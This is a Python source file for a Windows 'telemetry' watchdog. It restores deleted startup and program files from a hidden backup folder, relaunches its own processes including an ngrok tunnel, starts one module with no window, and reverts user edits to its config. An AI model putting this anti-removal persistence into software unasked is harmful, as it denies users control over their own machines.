import win32com.client
import os
import time
import subprocess
import sys
import json
from shutil import rmtree
from shutil import copytree
from shutil import copy

# Set up the backup file area, and copy data across. Ensures there is always a set of backup files available for the app
def startup_file_management():
    try:
        if (os.path.exists("C:/ProgramData/Telbackup")):
            rmtree("C:/ProgramData/Telbackup")
        os.makedirs("C:/ProgramData/Telbackup")
        os.makedirs("C:/ProgramData/Telbackup/Startup")
        os.makedirs("C:/ProgramData/Telbackup/Program")
        copy("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/telstartup.exe", "C:/ProgramData/Telbackup/Startup")
        copy("C:/Telservice/config-generator.exe", "C:/ProgramData/Telbackup/Program")
        copy("C:/Telservice/launch-manager.exe", "C:/ProgramData/Telbackup/Program")
        copy("C:/Telservice/config.json", "C:/ProgramData/Telbackup/Program")
    except:
        print ("Unable to modify files due to folder restrictions")

# Manage startup files, copy over a replacement if deleted.
def manage_startup_folders():
    if (os.path.exists("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/telstartup.exe")):
        print ("Startup file exists")
    else:
        try:
            copy("C:/ProgramData/Telbackup/Startup/telstartup.exe", "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp")
        except:
            print ("Error: Both startup files have been deleted or folder permissions prohibit file copying")
    
    if (os.path.exists("C:/ProgramData/Telbackup/Startup/telstartup.exe")):
        print ("Startup file backup exists")
    else:
        try:
            copy("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/telstartup.exe", "C:/ProgramData/Telbackup/Startup")
        except:
            print ("Error: Both startup files have been deleted or or folder permissions prohibit file copying")

# Manage any files not protected by the Windows 'file in use' flag, copy over a replacement config file
# Potentially could be made better in the future by having method iterate through apps
def manage_telemetry_files_folders():
    # Config.json protection
    if (os.path.exists("C:/Telservice/config.json")):
        print ("Config file exists")
    else:
        try:
            copy("C:/ProgramData/Telbackup/Program/config.json", "C:/Telservice")
        except:
            print ("Error: Both config files have been deleted or folder permissions prohibit file copying")
    if (os.path.exists("C:/ProgramData/Telbackup/Program/config.json")):
        print ("Config file backup exists")
    else:
        try:
            copy("C:/Telservice/config.json", "C:/ProgramData/Telbackup/Program")
        except:
            print ("Error: Both config files have been deleted or folder permissions prohibit file copying")

    # Config generator monitoring
    if (os.path.exists("C:/Telservice/config-generator.exe")):
        print ("Config generator file exists")
    else:
        try:
            copy("C:/ProgramData/Telbackup/Program/config-generator.exe", "C:/Telservice")
        except:
            print ("Error: Both config generator apps have been deleted or folder permissions prohibit file copying")
    if (os.path.exists("C:/ProgramData/Telbackup/Program/config-generator.exe")):
        print ("Config generator file backup exists")
    else:
        try:
            copy("C:/Telservice/config-generator.exe", "C:/ProgramData/Telbackup/Program")
        except:
            print ("Error: Both config generator apps have been deleted or folder permissions prohibit file copying")
    
    # Launch manager monitoring
    if (os.path.exists("C:/Telservice/launch-manager.exe")):
        print ("Launch manager file exists")
    else:
        try:
            copy("C:/ProgramData/Telbackup/Program/launch-manager.exe", "C:/Telservice")
        except:
            print ("Error: Both launch manager apps have been deleted or folder permissions prohibit file copying")
    if (os.path.exists("C:/ProgramData/Telbackup/Program/launch-manager.exe")):
        print ("Launch manager file backup exists")
    else:
        try:
            copy("C:/Telservice/launch-manager.exe", "C:/ProgramData/Telbackup/Program")
        except:
            print ("Error: Both launch manager apps have been deleted or folder permissions prohibit file copying")

# Scans services for the Telemetry app processes, reopens them in the event they are not open.
def manage_services():
    # Gets list of current Windows processes
    strComputer = "."
    objWMIService = win32com.client.Dispatch("WbemScripting.SWbemLocator")
    objSWbemServices = objWMIService.ConnectServer(strComputer,"root\cimv2")
    colItems = objSWbemServices.ExecQuery("Select * from Win32_Process")

    telservice_alive = False
    ngrok_alive = False
    mmodule_alive = False

    print ("Scanning active services...")

    for objItem in colItems:
        if (objItem.Name == "telservice.exe"):
            telservice_alive = True
        if (objItem.Name == "ngrok.exe"):
            ngrok_alive = True
        if (objItem.Name == "mmodule.exe"):
            mmodule_alive = True

    print ("Found "+str(len(colItems))+" services running")

    if telservice_alive == False:
        os.system("TASKKILL /F /IM ngrok.exe")
        os.system("TASKKILL /F /IM mmodule.exe")
        subprocess.run('launch-manager.exe')
        time.sleep(1)
        quit()
    else:
        print ("Telservice alive")

    if ngrok_alive == False:
        os.system("TASKKILL /F /IM telservice.exe")
        os.system("TASKKILL /F /IM mmodule.exe")
        subprocess.run('launch-manager.exe')
        time.sleep(1)
        quit()
    else:
        print ("Ngrok alive")

    if mmodule_alive == False:
        CREATE_NO_WINDOW = 0x08000000
        subprocess.Popen('mmodule.exe', creationflags=CREATE_NO_WINDOW)
    else:
        print ("mmodule alive")

# Monitors the JSON config, and if it is modified (stores current config in memory). If it is modified, program will replace the original values.
def monitor_json_content(api_url, user_email, api_key, device_name, ngrok_url):
    with open('config.json') as json_file:
        # Main config.json file checking
        data = json.load(json_file)
        current_api_url = data['desktop-api']
        current_user_email = data['user-email']
        current_api_key = data['user-api-key']
        current_device_name = data['device-name']
    
    if (current_api_url == api_url and current_user_email == user_email and current_api_key == api_key and current_device_name == device_name):
        print ("JSON file has not been modified")
    else:
        os.remove("config.json")
        json_data = {
            "user-email": user_email, 
            "ngrok-address": ngrok_url, 
            "device-name": device_name, 
            "user-api-key": api_key, 
            "desktop-api": api_url
            }
        with open('config.json', 'w') as outfile:  
            json.dump(json_data, outfile)

    # Backup json file checking
    with open('C:/ProgramData/Telbackup/Program/config.json') as json_file:  
        data = json.load(json_file)
        current_api_url = data['desktop-api']
        current_user_email = data['user-email']
        current_api_key = data['user-api-key']
        current_device_name = data['device-name']
    
    if (current_api_url == api_url and current_user_email == user_email and current_api_key == api_key and current_device_name == device_name):
        print ("JSON backup file has not been modified")
    else:
        os.remove("C:/ProgramData/Telbackup/Program/config.json")
        json_data = {
            "user-email": user_email, 
            "ngrok-address": ngrok_url, 
            "device-name": device_name, 
            "user-api-key": api_key, 
            "desktop-api": api_url
            }
        with open('C:/ProgramData/Telbackup/Program/config.json', 'w') as outfile:  
            json.dump(json_data, outfile)

# Program Start
print ("App starting..")
CREATE_NO_WINDOW = 0x08000000
subprocess.Popen('mmodule.exe', creationflags=CREATE_NO_WINDOW)
startup_file_management()

with open('config.json') as json_file:  
    data = json.load(json_file)
    api_url = data['desktop-api']
    user_email = data['user-email']
    api_key = data['user-api-key']
    device_name = data['device-name']
    ngrok_url = data['ngrok-address']

while 1:
    manage_services()
    manage_startup_folders()
    manage_telemetry_files_folders()
    monitor_json_content(api_url, user_email, api_key, device_name, ngrok_url)
    time.sleep(1)